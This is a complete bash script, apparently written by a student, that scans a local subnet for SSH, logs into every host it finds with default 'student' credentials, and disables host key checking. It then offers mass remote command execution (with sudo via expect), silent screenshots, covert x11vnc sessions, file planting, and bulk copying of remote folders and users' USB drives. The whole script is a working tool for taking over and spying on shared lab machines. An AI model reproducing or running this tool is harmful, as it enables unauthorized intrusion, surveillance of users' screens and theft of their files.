#!/bin/bash
clear
echo "Starting...
"
#pid of top shell(for exit function)
TOP_PID=$$

#Exit function (This is here cuz bash is a bitch)
housekeeping() {

exit_script() {
	#Deleting temp file
	echo "Deleting temp..."
	rm $tempfile $error $buffer 2>/dev/null

	#Restoring ssh_config file
	if [ ! -z ${no_check} ]; then
	echo "Restoring config file..." 
	rm ~/.ssh/config
	fi

	#Clearing variables
	echo "Clearing variables..."
	unset no_check
	unset sshp_loc
	unset subnet
	unset range
	unset prompt
	unset choice
	unset add_ip_excep
	unset own_ip_excep
	unset own_ip
	unset list	
	
	#Kill listening mode (if running)
	pid_listen=$(ps -ax | grep 'listening_mode' | awk {'print $1'})
	kill $pid_listen 2>/dev/null

	#exit/end
	echo "Goodbye"
	kill -s TERM $TOP_PID
	}

echo
##Get this to work... Workaround in form of non_destr_exit func in main section
#echo "Sure you want to exit?(y/n)"
#read prompt 
#if [ $prompt = "n" ] 2> /dev/null ; then
#	clear
#	echo 
#	${main:-return 1} 
#	main
#fi
exit_script
}


#Main stuff
non_destr_exit()  {
	clear
	echo "Are you sure?"
	read -p "(y/n):" prompt
	if [ $prompt = "n" ] 2>/dev/null; then
		main
	else
		housekeeping
	fi
}
back() {
	echo "
Press any key to return"
	read -n 1 -s
	main
}
#This needs to be a separate script! :D
lone_host(){
	clear
	echo "Current hosts in tempfile
"
	cat $tempfile
	echo "
Enter ip"
	read -p ":" lone_host_ip

 lone_host_wrap(){

	change_ip(){
		clear
		read -p "Enter new ip:" lone_host_ip
		lone_host_wrap
	}
	lone_vnc(){
		clear	
		echo "Checking if x11vnc is installed on the target machine..."
		isinstalled=$(sshpass -p$password ssh $user@$lone_host_ip "which x11vnc")
		if [ ! $isinstalled ]; then
		echo "Nope, installing..."
			./expect_script.exp $lone_host_ip $user $password "sudo apt-get install x11vnc"
		fi
		echo "Starting a vnc session on display :1"
		sshpass -p$password ssh $user@$lone_host_ip "x11vnc"
		echo "
Done(quits on disconnect), start vncviewer as viewonly?"
		read -p "(y/n):" prompt
		if [ $prompt = "y" ]; then
		viewonly='-viewonly'
		fi
		vncviewer $viewonly $lone_host_ip:1 &
		echo "
Press any key to continue"
		read -n 1 -s
		lone_host_wrap 
	}
	lone_screengrab(){
		clear
		sshpass -p$password ssh $user@$lone_host_ip "DISPLAY=:0 nohup gnome-screenshot -f palindrome"
		sshpass -p$password scp $user@$lone_host_ip:~/palindrome $warehouse/screengrabs/lone/$host
		sshpass -p$password ssh $user@$lone_host_ip "rm palindrome"	
		echo "Done"
		echo "Opening image..."
		xdg-open $warehouse/screengrabs/lone/$host
		lone_host_wrap
	}
	lone_xdo(){
		x-terminal-emulator -e "bash -c \"./xdo_suite.sh $lone_host_ip $password; exec bash\"" &
	lone_host_wrap
	}

	clear
	echo "Working ip: $lone_host_ip

Choose an option:
1.vnc
2.screengrab
3.change working ip
4.xdotool
0.back"
	read -p "Enter number:" choice
	case $choice in
	1 ) lone_vnc ;;
	2 ) lone_screengrab ;;
	3 ) change_ip ;;
	4 ) lone_xdo ;;
	0 ) main ;;
	* ) lone_host_wrap ;;
	esac
 
 }
 lone_host_wrap
}

serial() {
	sshpass_func() {
		clear
		echo "Enter command to execute"
		read command
		echo "
"
		for host in $(cat $tempfile); do
			sshpass -p$password ssh $user@$host "DISPLAY=:0 nohup $command" 2> $error
		echo "Executing on $user@$host"
		if [ ! -s $error ]; then
			echo "Success"
		else
			cat $error
		fi
		done
		back
	}
	expect_func() {
		clear
		echo "Enter command to execute"
		read command
		echo "
"
		for host in $(cat $tempfile); do
			#Look at the expect_script file to figure out how this works
			./expect_script.exp $host $user $password "$command"
		echo "Executing on $user@$host"
		if [ ! -s $error ]; then
			echo "Success"
		else
			cat $error
		fi
		done
		back	 
	}
	clear
	echo "sshpass or expect (choose expect for root access):"
	echo "1.sshpass
2.expect
0.back
"
	read -p "Enter number:" choice
	case $choice in 
	
	1 ) sshpass_func  ;;
	2 ) expect_func ;; 
	0 ) main ;;
	* ) serial ;;
	esac
}

explosion() {
	clear
	echo "Enter command"	
	read command
	echo "
"
	for host in $(cat $tempfile); do
		sshpass -p$password ssh -f $user@$host "DISPLAY=:0 nohup $command > /dev/null 2>&1 &" 2> $error
	echo "Executing on $user@$host"
	if [ ! -s $error ]; then
		echo "Success"
	else
		cat $error
	fi
	done
	back	
}

file_dump() {
	file_dump_manual() {
		clear
		echo "Enter folder on remote host"
		read location
		for host in $(cat $tempfile); do
			sshpass -p$password scp -r $user@$host:$location $warehouse/dump/manual/$host
		done
		unset location
		back
	} 
	file_dump_pendrive() {
		clear
		echo "Pulling files from connected external drives...
Remember to not include own ip in hosts list"
		for host in $(cat $tempfile); do 
			sshpass -p$password scp -r $user@$host:/media/student $warehouse/dump/pendrive
		done
		back
	}
	file_dump_fdrive() {
		echo "shut the f up"
	}

	clear
	echo "Choose an option 
1.manual
2.pendrive
3.fdrive
0.back
"
	read -p "Enter number:" choice
	case $choice in
	1 ) file_dump_manual ;;
	2 ) file_dump_pendrive ;;
	3 ) file_dump_fdrive ;;
	0 ) main ;;
	* ) file_dump ;;
	esac
}

screengrab() {
	clear
	echo "Grabbing screens..."
	for host in $(cat $tempfile); do
		sshpass -p$password ssh $user@$host "DISPLAY=:0 nohup gnome-screenshot -f palindrome" 
		sshpass -p$password scp $user@$host:~/palindrome $warehouse/screengrabs/$host
		sshpass -p$password ssh $user@$host "rm palindrome"
	done
	back
}

batch() {
	clear
	echo "Enter local file to copy [From warehouse folder]"
	read source_file
	echo "
Enter location to copy to on host [<ENTER> for home folder]"
	read cp_loc
	for host in $(cat $tempfile); do
		sshpass -p$password scp $warehouse/$source_file $user@$host:$cp_loc
	done
	unset source_file
	unset cp_loc
	back
}

hosts() {
	clear
	echo "Hosts list:
"
	if [ -s $tempfile ]; then
		cat $tempfile
	else
		echo "Nothing here..."
	fi
	back
}

listen() {
#export variables for use by listening mode in new terminal window with a child 'bash' process
	export subnet
	export range
	export own_ip
	export own_ip_excep
	export list
	export add_ip_excep
	export tempfile
	export buffer
	export verify_user
	x-terminal-emulator -e "bash -c \"./listening_mode.sh; exec bash\"" &
	main
}

main() {
clear
echo "Choose type:
1.Serial lights
2.Explosion
3.Lone host
4.Hosts list
5.Listening mode
6.Batch copy 
7.File dump
8.Screengrab
0.Exit"
read -p "Enter number:" choice

case $choice in 
	
	1 ) serial  ;;
	2 ) explosion ;; 
	3 ) lone_host  ;;
	4 ) hosts ;;
	5 ) listen ;;
	6 ) batch ;;
	7 ) file_dump ;;
	8 ) screengrab ;;
	0 ) non_destr_exit ;;
	* ) main ;;
esac
}

#Trapping the INT signal (ctrl+c)
trap 'housekeeping' INT

#Damn this config file...
echo "Removing the ssh config file if present...
"
rm ~/.ssh/config 2>/dev/null

#Checking if required programs are installed
echo "Checking if required packages are installed...
"
req_prog=( "nmap" "sshpass" "expect" "xdotool" "x-terminal-emulator" )
for i in "${req_prog[@]}";do
	prog=$(which $i)
	if [ -z ${prog} ]; then
		echo -n "$i is not installed. Proceed anyway?(y/n):"
		read prompt
		if [ $prompt = "n" ] 2>/dev/null ; then
			housekeeping
		fi
		else
		echo "$i is installed: $prog"
	fi
done
unset req_prog
unset prog

#Temporary buffer file
tempfile=$(mktemp /tmp/skript.XXXXXXXXXX) || exit 1
error=$(mktemp /tmp/error.XXXXXXXXXX) || exit 1
buffer=$(mktemp /tmp/buffer.XXXXXXXXXX) || exit 1

#Location of warehouse folder
warehouse=$(pwd)/warehouse

echo "
Press any key to continue"
read -n 1 -s

entry() 
{
clear
#Prompt for subnet addr
echo "
Enter subnet [default:192.168.3][Only /24 subnets]"
read -p ":" subnet
subnet="${subnet:-192.168.3}"


#IP range	
echo "
Use an ip range? [default:0-255]"
read -p ":" range
range="${range:-0/24}"
echo "
Scanning $subnet.$range
"

#Looking for hosts with ssh port open (I know it looks bad)
nmap -p22 $subnet.$range -oG - 2>$error 1>$buffer
echo "Tempfile: $tempfile"

#lol just realised i could have used awk... well at least i've got regex skillz 
grep 'open' $buffer | sed -r 's/.* ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+).*/\1/' >$tempfile  
}
entry

#Ahem, error handling :D (for the scanning part)
if [ -s $error ]; then 
	cat $error
	echo "Looks like the nmap command failed... Press any key to retry."
	read -n 1 -s 
	entry
fi 

#Display the hosts list
echo "
Targets:"
cat $tempfile
if [ ! -s $tempfile ]; then
	echo "No hosts found
Continue anyway?"
	read -p "(y/n):"  prompt
	if [ ! $prompt = "y" ] 2>/dev/null ; then
		housekeeping
	fi
fi 


#Own ip exception(Mind the string of commands to find own_ip... super un-portable)
echo "
Add own ip exception? [<ENTER>='n'] (Better kill ssh)"
read -p "(y/n):" prompt
if [ $prompt = "y" ] 2>/dev/null ; then 
	own_ip_excep=true
	own_ip=$(ip addr | grep "BROADCAST,MULTICAST,UP" -A2 | tail -n1 | awk '{ print $2 }')
	ip_length=${#own_ip}
	ip_length=$(expr $ip_length - 3)
	own_ip=${own_ip:0:$ip_length}
	if [ $(grep $own_ip $tempfile) ]; then
		sed "s/$own_ip\b//" $tempfile >$buffer
		sed '/^$/d' $buffer >$tempfile		#To remove empty lines
	else
		echo "
looks like your ip isn't present in the list..."
	fi
fi

#Additional ip exception
echo "
Enter ip's to be removed from list [space separated][leave empty for none]"
read -p ":" list
if [ -z "${list}" ];then
	:
else
	add_ip_excep=true
	for host in $list; do
		sed "s/$host\b//" $tempfile >$buffer
		sed '/^$/d' $buffer >$tempfile
	done
fi

#Disabling StrictHostKeyChecking to ease automation
#Alternative command for ssh exists. Remember to change this
echo "
Disable key check? [<ENTER>='n']"
read -p "(y/n):" prompt 
if [ $prompt = "y" ] 2>/dev/null ; then
	echo "
Disabling..."
	printf 'Host *\n\tStrictHostKeyChecking no' >> ~/.ssh/config
	no_check=true
fi


#Get the host username and the password
echo "
Enter host username (default:student)"
read -p ":" user
user="${user:-student}"
echo "Enter ssh password (default:student)"
read -s -p ":" password
password="${password:-student}"

#Password verification 
echo "

Verify username and password? [<ENTER>='n']"
read -p "(y/n):" prompt
if [ $prompt = "y" ]; then
	clear
	for host in $(cat $tempfile); do
		echo "Checking $host"
		sshpass -p$password ssh $user@$host ":" 2>$error
		if [ -s $error ]; then
			echo "	Removing $host"
			sed "s/$host\b//" $tempfile >$buffer
			sed '/^$/d' $buffer >$tempfile
		fi
	done
	verify_user=true
	echo "
Done"
	echo "Press any key to continue"
	read -n 1 -s
fi


#Finally,
main
